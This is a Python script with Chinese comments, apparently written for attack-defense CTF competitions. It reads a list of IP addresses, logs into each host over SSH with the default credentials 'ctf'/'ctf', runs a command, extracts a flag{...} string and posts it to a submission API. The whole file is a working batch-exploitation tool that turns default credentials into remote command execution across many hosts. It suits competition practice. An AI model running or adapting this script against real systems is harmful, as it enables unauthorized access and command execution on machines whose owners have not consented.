import paramiko
import re
import requests

# 从文本文件中读取IP地址
def read_targets_from_file(file_path):
    with open(file_path, "r") as f:
        return [line.strip() for line in f.readlines()]

# 用于批量提交flag的API地址和API密钥
flag_submit_url = "" #flag提交平台网址
api_key = "" #队伍ID，如果没用则留空

# 默认登录凭据
username = "ctf"
password = "ctf"

# 获取flag的指令
command = "whoami"

# 获取并提交flag
def exploit_and_submit(target):
    try:
        # 使用paramiko连接到远程主机
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target, username=username, password=password, timeout=5)

        # 执行命令
        _, stdout, _ = ssh.exec_command(command)
        output = stdout.read().decode("utf-8","ignore")

        # 输出指令执行的结果
        print('\n')
        print(f"命令执行结果: {target}:")
        print(output)

        # 根据具体情况提取flag
        flag = extract_flag(output)

        # 提交flag
        if flag:
            submit_flag(flag)
        else:
            print(f"Flag not found for target {target}")

        # 关闭SSH连接
        ssh.close()
    except Exception as e:
        print(f"Error exploiting {target}: {e}")

# 从攻击响应中提取flag
def extract_flag(response_content):
    # 使用贪婪模式的正则表达式匹配flag
    flag_pattern = re.compile(r"flag\{.*\}")
    match = flag_pattern.search(response_content)
    if match:
        return match.group(0)
    else:
        return None

# 向比赛平台提交flag
def submit_flag(flag):
    data = {
        "api_key": api_key,
        "flag": flag,
    }
    try:
        r = requests.post(flag_submit_url, data=data)
        if r.status_code == 200:
            print(f"Flag submitted successfully: {flag}")
        else:
            print(f"Error submitting flag: {r.content}")
    except Exception as e:
        print(f"Error submitting flag: {e}")

# 将目标列表从文本文件中读取
targets_file = "ips.txt"
targets = read_targets_from_file(targets_file)

# 遍历目标列表并执行命令
for target in targets:
    exploit_and_submit(target)